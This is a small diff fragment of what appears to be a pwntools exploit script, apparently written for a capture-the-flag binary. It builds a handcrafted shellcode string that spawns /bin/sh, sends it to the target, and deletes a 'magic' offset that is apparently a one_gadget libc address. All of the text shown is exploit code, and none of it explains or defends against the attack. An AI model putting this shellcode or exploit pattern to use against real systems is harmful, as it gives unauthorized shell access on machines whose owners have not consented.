@@ -66,8 +66,6 @@ Y   = pop rcx
 
 sc = 'j;X4;PP^ZXXXXXXXXXXXXh4>;;XH5;;;;PXXXXj;XT_j;YYY' + 'D' * 0x20 + '/bin/sh\x00' 
 
-magic = 0x4526a
-
 
 y.sendline( sc )
 
